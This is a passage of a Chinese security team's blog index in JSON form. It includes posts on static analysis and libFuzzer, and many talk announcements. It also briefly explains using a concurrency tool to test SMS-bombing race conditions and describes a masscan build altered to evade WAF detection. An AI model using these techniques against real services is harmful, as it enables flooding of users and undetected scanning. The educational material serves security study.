直接下载jar包之后，选择路径，之后next即可 使用 这里使用方式，我们首先选中我们需要并发测试的数据包 这样我们就会进入 这里可以选择你需要的脚本 这里以短信轰炸漏洞为例我们针对数据包，在Host下面添加 1x-req: %s 选择脚本 然后点击最下面的attack即可 %s为我们进行fuzz的内容，如果没有请求，可以加在任何位置 1race.py 这里30是并发连接数 100是并发连接请求数 成功可以在下面看到RPS 成功15次","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"SRC","slug":"SRC","permalink":"http://example.com/tags/SRC/"}],"author":"【白】"},{"title":"静态程序分析（SPA）","slug":"SPA","date":"2024-03-17T05:58:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2024/03/17/SPA/","permalink":"http://example.com/2024/03/17/SPA/","excerpt":"","text":"PL(Programing Language)程序语言PL(Programing Language)大致可以分成三部分： 理论部分：语言设计、类型系统、形式语义和程序逻辑等。即在理论上构建出一个语言。 环境部分：编译、运行时系统等。即相应的支撑语言运行的一套系统。 应用部分：程序分析、程序验证、程序合成等。在语言层面谈到程序分析，实际上指的就是静态程序分析。 从软工的角度来看很多人做的程序分析是动态分析，但在PL领域的程序分析是静态分析。 为什么需要静态分析静态分析也就是在程序运行之前，在编译时期完成所有的分析过程，”静态”即不用去运行程序就能进行分析。 检测可靠性相关的问题 例如，要避免空指针引用(null pointer dereference)，如Java运行时的NullPointerException。又如，要避免内存泄漏(memory leak)，如C中malloc的空间一直没有free掉。 检测安全性相关的问题 例如，要避免私有信息泄漏(private information leak)，如在安卓某个应用中输入的账号密码不应被其它应用劫持。又如，要避免注入攻击(injection attack)，如SQL注入可以恶意操作服务器数据库。 编译优化(compiler optimization) 编译优化是编译器后端的部分，大部分的编译优化（除了JIT那种在线的）用的都是静态分析的技术。例如，死代码消除(dead code elimination)，即将永远不可能执行到的代码删除。又如，代码移动(code motion)，如将循环内部和循环无关的重复计算提到循环的外面。 程序理解(program understanding) 如很多IDE中能追踪函数调用的层级关系(IDE call hierarchy)。又如类型提示(type indication)，对动态类型的语言这个尤为重要。 当下静态程序分析的市场情况在工业界中，微软等一线国际互联网工业大厂都开始进行了SPA的研究吗，也有了诸多解决方案工具的问世。在国外有着Oracle, Google, Microsoft, IBM, Facebook等公司，而国内有着华为、阿里巴巴、腾讯、网易、字节跳动、京东、美团、航空航天研究院、国家电网研究院、中国电信、央行金融研究院等企业单位同样做出了一定的成果。目前有着不少专门做静态分析解决方案SAST、SCA的公司崛起，他们主要有龙智科技、寻臻科技、安势信息、鸿渐科技、比瓴科技等。 学术届对此类方向一直保持着高度的热情。曾经有很多图灵奖的获得者都是凭借着在程序语言的方向做出了推动计算机界的成果才获此荣誉。其实程序分析并不是一个全新的方向，早在编译的研究中就已经出现，比如《编译原理》中我们耳熟能详的词法分析、语法分析、语义分析、可达定义分析、变量活性分析等等。随着技术的发展，我们也可以在AST，或者IR中进行指针指向分析、流敏感分析、上下文敏感分析等更细致的分析。 IR中间表示IR,中间代码(Intermediate Representation,有时也称为Intermediate Code,IC)，它是编译器中很重要的一种数据结构。编译器在做完前端工作以后，首先就生成IR,并在此基础上执行各种优化算法，最后再生成目标代码。 中间代码表示形式： 树和有向无环图（DAG） 高层表示，适用于程序源代码； 三地址码（3-address code） 低层表示，靠近目标机器； 控制流图（CFG） 更精细的三地址码，程序的图状表示适合做程序分析、程序优化等； 静态单赋值形式（SSA） 更精细的控制流图同时编码控制流信息和数据流信息； 连续传递风格（CPS） 更一般的SSA，可以表达跨函数、跨模块的控制跳转，而SSA一般是函数内部。 中间语言高级抽象化在AST、三地址码、SSA（静态单赋值）形式之上，还有着更高级的表现形式。如CFG、ICFG、VFG、SVFG、PDG等等。（CFG: Control Flow Graph; ICFG: Inter- Control Flow Graph; VFG: Value Flow Graph; SVFG: Spare Value Flow Graph） 当我们有了更高级的表示之后，就可以在其抽象数据结构上总结规律、执行算法，甚至是将复杂的问题转化为图上的结点、路径规划问题等方式。 解决方案实体化在有了前面的介绍之后，我们就可以介绍具体的应用部分了。我们的核心思想是：将复杂的判定问题转化为图上的路径布尔可满足性问题。在将IR转换成图中的结点和边后，中间的路径约束也随之构建而成。实际的应用之中，要么按需在图上添加、删除部分结点、边，要么在已经按需构建的图上选取一对或多对结点寻找路径。 第一个案例就是前者所描述的场景——指针分析： 指针分析是数据流分析的一种，主要目的是计算运行时指针可能指向的内存区域。输入为我们的高级抽象图，输出为points-to set（指针指向集合），即哪些变量指向同一个指针内存区域的集合。 图中案例为指针分析最经典的Andersen算法，它采用worklist的工作思想。在执行过程中，对于指针变量流向的位置，添加边将两点之间连接，直到遍历完全部的结点。至此，所有指向同一指针内存区域的相关变量均已连通，故将其提取出points-to set。 指针分析可以应用于：建立变量之间的数据依赖关系。 变量别名分析：在下面代码中p &#x3D; &a; q &#x3D; p; *p &#x3D; x; y &#x3D; *q;。因为 p、q都指向同一块内存，所以 y 的值和 x 一样。 编译优化和bug检测： 常量传播：*p &#x3D; 1; x &#x3D; *q; 中，如果 p 和 q 在任意情况下都是别名（must-aliases，在每个执行路径 p 和 q 都指向同一块内存）那么 x 就是常量 1。 污点分析：*p &#x3D; errorInput; x &#x3D; *q; 如果 p 、q 是别名那么 x 可能受污点影响。 第二个案例是后者所描述的场景——特定异常分析： 对于特定漏洞分析我们重点强调Memory Leak、Double Free、Null Pointer Dereferences等漏洞。 主要的思路是: 1、进行指针分析和value flow分析建立sparse value flow graph. 2、基于sparse value flow graph（svfg）进行some path分析，即在value flow graph上进行source-sink分析（从 malloc 到 free 的svfg路径）。如果一个source点不能在svfg上到达sink点，那么表示该 malloc 从没有被 free，一定存在内存泄漏，报出 NeverFree 错误。 3、接下来进行all path分析，主要目的是确保在每个control-flow路径上source点都能达到sink点，如果存在一个control-flow路径source点没有到达sink点，那么报出 PartialLeak 错误。 图中（a）为程序的源程序代码，（b）为全稀疏的静态单赋值表示形式以及约束点，（c）为简化版的稀疏值流图（路径上已经构造了约束）。我们可以发现指向二级指针的声明点， 指向一级指针的声明点，指向二级指针的释放点，指向一级指针的时放点。两条路径连通，即每个指针都能够有声明和释放，即没有错误产生。对于这种判定方式，我们称之为source-sink分析。如果这两条路径有一条没有连通，即发生了Memory Leak错误；如果有其中一条路径从起始点（假设为）出发，同时走到了两个终点（），则判定为double free错误；如果程序发生改变，即为空指针变量初始化的位置，为空指针变量解引用的位置，那么如果路径可达，则判定为发生了空指针解引用的操作。 经典非商用程序分析框架（C&#x2F;C++、Java生态） 对于经典的非商用程序分析框架，有很多开源工具给学术界和工业界做了不少的参考。其中JAVA生态中的经典当属SOOT，C&#x2F;C++效果好的则是Yelei Sui老师团队开发的SVF。 静态程序分析趋势当下的静态程序分析还是国外做的好一些，国内的SAST、SCA产品还有很长的路要走。","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"SPA","slug":"SPA","permalink":"http://example.com/tags/SPA/"}],"author":"monster290"},{"title":"静态程序分析入门","slug":"SPA-share","date":"2024-03-13T02:10:19.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2024/03/13/SPA-share/","permalink":"http://example.com/2024/03/13/SPA-share/","excerpt":"","text":"分享人：monster","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"SPA","slug":"SPA","permalink":"http://example.com/tags/SPA/"}],"author":"monster290"},{"title":"内网过waf检测扫描工具","slug":"waf-bypass-tool","date":"2024-03-11T09:35:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2024/03/11/waf-bypass-tool/","permalink":"http://example.com/2024/03/11/waf-bypass-tool/","excerpt":"","text":"MASSCAN是TCP端口扫描程序，它异步传输SYN数据包，产生的结果与最著名的端口扫描程序nmap相似。在内部，它更像scanrand、unicornscan和ZMap，使用异步传输。它是一个灵活的实用程序，允许任意地址和端口范围。正常情况下，扫描器进行扫描的时候，会有个特征，如果目标端口为80，masscan发出去的探测包会带着”masscan”字眼，这里通过反编译，把这种特征去掉，最后达到waf检测不到的效果。 获取工具关注公众号SecNL安全团队，回复关键词 1masscan 注： 本工具由本团队佛系白猫提供","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Bypass","slug":"Bypass","permalink":"http://example.com/tags/Bypass/"}],"author":"佛系白猫"},{"title":"FPS游戏安全入门","slug":"fps-sec","date":"2024-03-06T12:19:20.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2024/03/06/fps-sec/","permalink":"http://example.com/2024/03/06/fps-sec/","excerpt":"","text":"分享人：L@in","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"FPS游戏安全","slug":"FPS游戏安全","permalink":"http://example.com/tags/FPS%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"Fuzzing模糊测试——带你初入模糊测试时代","slug":"fuzz_introduction","date":"2024-03-06T01:18:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2024/03/06/fuzz_introduction/","permalink":"http://example.com/2024/03/06/fuzz_introduction/","excerpt":"","text":"模糊测试，又称为模糊化测试或模糊化，是一种测试软件的方法。其核心思想是将自动生成或半自动生成的随机数据注入到程序中，然后监视程序的异常行为，如崩溃或断言失败，以便发现潜在的程序错误，比如内存泄漏。通常，模糊测试被广泛应用于揭示软件或计算机系统的安全漏洞。 本篇文章会给大家讲解一下基本的模糊测试的原理和介绍。 测试分类模糊测试工具主要分为两大类，即变异测试和生成测试。该方法可以作为白盒、灰盒或黑盒测试的一种手段。尽管文件格式和网络协议是最常见的测试目标，但任何程序输入都可能成为测试对象，包括环境变量、鼠标和键盘事件以及API调用序列。甚至一些通常被忽视的对象，如数据库中的数据或共享内存，也可以用于测试。 有人可能质疑，这不就是随机数自动化测试吗？为何称其为模糊测试？在随机测试中，著名的例子是Android的Monkey Test。其思想是模拟猴子毫无逻辑的操作，以测试手机软件的健壮性。然而，Monkey Test主要关注测试用户界面上的随机操作，而对于一些深层次、底层的问题，比如通讯协议的缺陷，却很难发现。因此，模糊测试更强调通过注入各种随机数据来全面测试程序的鲁棒性和安全性。 目前二进制漏洞挖掘流行的技术就是污点分析、符号执行、模糊测试，三者的结合和近年来AI技术的发展，深度学习的入局对模糊测试产生了深远的影响。 对于这些内容，静态分析还是要系统的学一遍，这里是参考知乎大佬的回答所给的 目前这个课程国内只有北京大学和南京大学有完整的教案。 北京大学：【北京大学公开课】软件分析技术 南京大学软件分析课程录播：南京大学《软件分析》 国外的课件：Static Program Analysis 测试对象 白盒源代码 黑盒仅二进制文件 环境变量和参数 Web应用程序：wfuzz 网络协议 Web浏览器和内存数据 物联网固件 API应用程序的FUZZ 黑盒测试模式 黑盒测试是一种功能导向的测试方法，测试人员不需要知道应用程序的内部工作原理，而是关注于确保软件系统按照规格说明的要求执行。测试人员将输入提供给系统，观察系统的输出，然后比较输出与预期结果，从而评估软件的正确性和功能性。 实战举例简单理解 libfuzzer 就是，如果我们要 fuzz 一个程序，找到一个入口函数，然后利用 1extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) &#123; ....... .......&#125; 接口（hardness），我们可以拿到 libfuzzer 生成的 测试数据以及测试数据的长度，我们的任务就是把这些生成的测试数据传入到目标程序中让程序来处理测试数据， 同时要尽可能的触发更多的代码逻辑。 这个是官方文档给的定义 我们来查看官方的例子 12345678910111213141516//fuzz_me.cc#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;bool FuzzMe(const uint8_t *Data, size_t DataSize) &#123; return DataSize &gt;= 3 &amp;&amp; Data[0] == &#x27;F&#x27; &amp;&amp; Data[1] == &#x27;U&#x27; &amp;&amp; Data[2] == &#x27;Z&#x27; &amp;&amp; Data[3] == &#x27;Z&#x27;; // :‑&lt;&#125;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) &#123; FuzzMe(Data, Size); return 0;&#125; 要为此目标构建模糊器二进制文件，使用最新的 Clang 编译器编译源代码带有以下的参数： -fsanitize&#x3D;fuzzer（必需）：向 libFuzzer 提供进程内覆盖率信息以及与 libFuzzer 运行时的链接 -fsanitize&#x3D;address（推荐）：启用 AddressSanitizer -g（推荐）：启用调试信息，使错误消息更易于阅读 编译选项，并且运行 1clang++ -g -fsanitize=address,fuzzer fuzzing/tutorial/libFuzzer/fuzz_me.cc 说明 可以看出这个模糊器从INFO: Seed: 851904448随机种子开始 默认情况下，libFuzzer 假定所有输入都为 4096 字节或更小 这里进行了报错，在这个代码中的第九行第七列发生的 这里保存了crash的文件 查看crash文件 可以得出，在函数输入为三个字符的时候，数组下标3会发生越界访问","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"FUZZ","slug":"FUZZ","permalink":"http://example.com/tags/FUZZ/"}],"author":"Kidder1"},{"title":"微信小程序session_key泄露","slug":"wx-session_key","date":"2024-02-19T15:24:42.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2024/02/19/wx-session_key/","permalink":"http://example.com/2024/02/19/wx-session_key/","excerpt":"","text":"分享人：彦语","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"彦语"},{"title":"从零开始的SSRF","slug":"ssrf","date":"2024-01-31T09:10:20.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2024/01/31/ssrf/","permalink":"http://example.com/2024/01/31/ssrf/","excerpt":"","text":"分享人：i3g1nner","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"}],"author":"i3g1nner"},{"title":"Node.js原型链污染","slug":"nodejs","date":"2024-01-18T10:08:34.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2024/01/18/nodejs/","permalink":"http://example.com/2024/01/18/nodejs/","excerpt":"","text":"分享人：蒙面阿强","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"Node.js","slug":"Node-js","permalink":"http://example.com/tags/Node-js/"}],"author":"SecureNexusLab"},{"title":"科普篇——关于考研、保研和找工作","slug":"postgraduate-job","date":"2024-01-07T13:01:47.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2024/01/07/postgraduate-job/","permalink":"http://example.com/2024/01/07/postgraduate-job/","excerpt":"","text":"分享人：rainki","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"科普","slug":"科普","permalink":"http://example.com/tags/%E7%A7%91%E6%99%AE/"}],"author":"SecureNexusLab"},{"title":"车联网安全入门分享","slug":"v2x-introduction","date":"2023-12-27T07:54:23.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/12/27/v2x-introduction/","permalink":"http://example.com/2023/12/27/v2x-introduction/","excerpt":"","text":"分享人：风间映川","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"车联网安全","slug":"车联网安全","permalink":"http://example.com/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"简单了解符号执行","slug":"symbolic-execution","date":"2023-12-20T08:41:46.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/12/20/symbolic-execution/","permalink":"http://example.com/2023/12/20/symbolic-execution/","excerpt":"","text":"分享人：Celeste_GXB","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"符号执行","slug":"符号执行","permalink":"http://example.com/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"}],"author":"SecureNexusLab"},{"title":"文件上传另类应用","slug":"upload-file-sp","date":"2023-12-20T08:27:54.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/12/20/upload-file-sp/","permalink":"http://example.com/2023/12/20/upload-file-sp/","excerpt":"","text":"分享人：老梁","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"文件上传","slug":"文件上传","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"author":"SecureNexusLab"},{"title":"物联网固件分析指南","slug":"iot-firmware-guide","date":"2023-12-11T03:04:19.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/12/11/iot-firmware-guide/","permalink":"http://example.com/2023/12/11/iot-firmware-guide/","excerpt":"","text":"分享人：gxh191","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"MEVBot Exploit","slug":"mevbot","date":"2023-12-05T12:50:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/12/05/mevbot/","permalink":"http://example.com/2023/12/05/mevbot/","excerpt":"","text":"分享人：LCatro","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"智能合约","slug":"智能合约","permalink":"http://example.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"}],"author":"SecureNexusLab"},{"title":"Hardhat框架与Uniswap交易代码","slug":"hardswap-uniswap","date":"2023-12-01T12:50:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/12/01/hardswap-uniswap/","permalink":"http://example.com/2023/12/01/hardswap-uniswap/","excerpt":"","text":"分享人：流竹君雅","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"智能合约","slug":"智能合约","permalink":"http://example.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"}],"author":"SecureNexusLab"},{"title":"物联网固件仿真与漏洞挖掘基础思路","slug":"iot-firmware","date":"2023-11-23T13:00:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/11/23/iot-firmware/","permalink":"http://example.com/2023/11/23/iot-firmware/","excerpt":"","text":"分享人：re1wn","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"Robot学习经历分享","slug":"robot-study","date":"2023-11-21T02:00:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/11/21/robot-study/","permalink":"http://example.com/2023/11/21/robot-study/","excerpt":"","text":"分享人：阳仔","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"IoT：手把手带你复现两个漏洞","slug":"iot-re","date":"2023-11-20T02:30:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/11/20/iot-re/","permalink":"http://example.com/2023/11/20/iot-re/","excerpt":"","text":"分享人：zer0_1s","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"DataCon经验分享","slug":"datacon","date":"2023-11-14T16:36:28.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/11/15/datacon/","permalink":"http://example.com/2023/11/15/datacon/","excerpt":"","text":"分享人：MOUCHEN","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"DataCon","slug":"DataCon","permalink":"http://example.com/tags/DataCon/"}],"author":"SecureNexusLab"},{"title":"SSTI服务端模板注入","slug":"ssti","date":"2023-11-14T09:17:02.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/11/14/ssti/","permalink":"http://example.com/2023/11/14/ssti/","excerpt":"","text":"分享人：i3eg1nner","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"SSTI","slug":"SSTI","permalink":"http://example.com/tags/SSTI/"}],"author":"SecureNexusLab"},{"title":"越权漏洞知识","slug":"broken-access-control","date":"2023-11-05T02:00:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/11/05/broken-access-control/","permalink":"http://example.com/2023/11/05/broken-access-control/","excerpt":"","text":"分享人：白色键盘","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"author":"SecureNexusLab"},{"title":"Fuzz模糊测试系列分享（四）libfuzz源码解读","slug":"fuzz-libfuzz-sourcecode","date":"2023-11-02T02:00:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/11/02/fuzz-libfuzz-sourcecode/","permalink":"http://example.com/2023/11/02/fuzz-libfuzz-sourcecode/","excerpt":"","text":"分享人：TBK","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"FUZZ","slug":"FUZZ","permalink":"http://example.com/tags/FUZZ/"}],"author":"SecureNexusLab"},{"title":"Fuzz模糊测试系列分享（三）libfuzz简介","slug":"fuzz-libfuzz-introduction","date":"2023-10-30T13:56:32.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/10/30/fuzz-libfuzz-introduction/","permalink":"http://example.com/2023/10/30/fuzz-libfuzz-introduction/","excerpt":"","text":"分享人：TBK","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"FUZZ","slug":"FUZZ","permalink":"http://example.com/tags/FUZZ/"}],"author":"SecureNexusLab"},{"title":"逻辑漏洞和src小技巧","slug":"logical-flaw","date":"2023-10-27T15:12:10.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/10/27/logical-flaw/","permalink":"http://example.com/2023/10/27/logical-flaw/","excerpt":"","text":"分享人：彦语","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"SRC","slug":"SRC","permalink":"http://example.com/tags/SRC/"}],"author":"SecureNexusLab"},{"title":"SQL注入防御绕过方法（SQL bypass）","slug":"sql-bypass","date":"2023-10-26T04:10:00.000Z","updated":"2024-03-18T03:29:12.000Z","comments":true,"path":"2023/10/26/sql-bypass/","permalink":"http://example.com/2023/10/26/sql-bypass/","excerpt":"","text":"分享人：白玉京","categories":[{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/categories/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"社区分享","slug":"社区分享","permalink":"http://example.com/tags/%E7%A4%BE%E5%8C%BA%E5%88%86%E4%BA%AB/"},{"name":"Bypass","slug":"Bypass","permalink":"http://example.com/tags/Bypass/"}],"author":"SecureNexusLab"},{"title":"Fuzz模糊测试系列分享（二）手写一个模糊测试器","slug":"fuzz-tester","date":"2023-10-14T08:22:32.000